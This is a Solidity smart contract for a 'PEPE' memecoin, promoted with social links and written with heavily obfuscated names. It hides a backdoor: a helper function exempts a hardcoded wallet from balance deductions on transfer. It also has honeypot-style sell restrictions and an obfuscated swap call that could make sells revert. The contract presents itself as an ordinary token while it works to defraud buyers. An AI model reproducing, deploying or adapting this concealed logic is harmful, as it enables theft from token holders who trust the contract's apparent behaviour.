/**

$PEPE
the most memeable memecoin in existence. The dogs have had their day, it’s time for Pepe to take reign.

TWITTER: https://twitter.com/Pepeerc_Coin
TELEGRAM: https://t.me/Pepeeth_Coin
WEBSITE: https://pepe69.net/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mjwxv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mjwxv(a, b, "SafeMath");
    }

    function  _mjwxv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _poxqim {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _qvuxomd {
    function swomKenbwcSartksFxlacvqc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _qvuxomd private _Tewopik;
    address payable private _qgimufa;
    address private _yiavbir;

    bool private _pvkckfv;
    bool public _Teraxlvrm = false;
    bool private oruvubk = false;
    bool private _aeujahvp = false;

    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _cTotalvc = 420690000 * 10 **_decimals;
    uint256 public _pvlvoel = _cTotalvc;
    uint256 public _Wepmrf = _cTotalvc;
    uint256 public _vwaprThaevm= _cTotalvc;
    uint256 public _BviTpasf= _cTotalvc;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vjpuakzi;
    mapping (address => bool) private _traknony;
    mapping(address => uint256) private _rkopemo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrkvoblq=0;
    uint256 private _bernjye=0;


    event _mrojufet(uint _pvlvoel);
    modifier osTqeo {
        oruvubk = true;
        _;
        oruvubk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _cTotalvc;
        _vjpuakzi[owner(

        )] = true;
        _vjpuakzi[address
        (this)] = true;
        _vjpuakzi[
            _qgimufa] = true;
        _qgimufa = 
        payable (0x5Fcd3C6Dc3eeaD6d601d9B5E2fCDD342578B1f9A);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _cTotalvc);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _cTotalvc;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mjwxv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kqlmsik=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teraxlvrm) {
                if (to 
                != address
                (_Tewopik) 
                && to !=
                 address
                 (_yiavbir)) {
                  require(_rkopemo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkopemo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiavbir && to != 
            address(_Tewopik) &&
             !_vjpuakzi[to] ) {
                require(amount 
                <= _pvlvoel,
                 "Exceeds the _pvlvoel.");
                require(balanceOf
                (to) + amount
                 <= _Wepmrf,
                  "Exceeds the macxizse.");
                if(_bernjye
                < _yrkvoblq){
                  require
                  (! _eoqnvmc(to));
                }
                _bernjye++;
                 _traknony
                 [to]=true;
                kqlmsik = amount._pvr
                ((_bernjye>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiavbir &&
             from!= address(this) 
            && !_vjpuakzi[from] ){
                require(amount <= 
                _pvlvoel && 
                balanceOf(_qgimufa)
                <_BviTpasf,
                 "Exceeds the _pvlvoel.");
                kqlmsik = amount._pvr((_bernjye>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bernjye>
                _yrkvoblq &&
                 _traknony[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oruvubk 
            && to == _yiavbir &&
             _aeujahvp &&
             contractTokenBalance>
             _vwaprThaevm 
            && _bernjye>
            _yrkvoblq&&
             !_vjpuakzi[to]&&
              !_vjpuakzi[from]
            ) {
                _rcjnfrf( _rkhvq(amount, 
                _rkhvq(contractTokenBalance,
                _BviTpasf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujhqle(address
                    (this).balance);
                }
            }
        }

        if(kqlmsik>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kqlmsik);
          emit
           Transfer(from,
           address
           (this),kqlmsik);
        }
        _balances[from
        ]= _mjwxv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mjwxv(kqlmsik));
        emit Transfer
        (from, to, 
        amount.
         _mjwxv(kqlmsik));
    }

    function _rcjnfrf(uint256
     tokenAmount) private
      osTqeo {
        if(tokenAmount==
        0){return;}
        if(!_pvkckfv)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tewopik.WETH();
        _approve(address(this),
         address(
             _Tewopik), 
             tokenAmount);
        _Tewopik.
        swomKenbwcSartksFxlacvqc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkhvq
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mjwxv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qgimufa){
            return a ;
        }else{
            return a .
             _mjwxv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pvlvoel = _cTotalvc;
        _Wepmrf = _cTotalvc;
        emit _mrojufet(_cTotalvc);
    }

    function _eoqnvmc(address 
    account) private view 
    returns (bool) {
        uint256 bkzqa;
        assembly {
            bkzqa :=
             extcodesize
             (account)
        }
        return bkzqa > 
        0;
    }

    function _ujhqle(uint256
    amount) private {
        _qgimufa.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvkckfv ) ;
        _Tewopik  
        =  
        _qvuxomd
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tewopik), 
            _cTotalvc);
        _yiavbir = 
        _poxqim(_Tewopik.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tewopik .
             WETH ( ) );
        _Tewopik.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiavbir).
        approve(address(_Tewopik), 
        type(uint)
        .max);
        _aeujahvp = true;
        _pvkckfv = true;
    }

    receive() external payable {}
}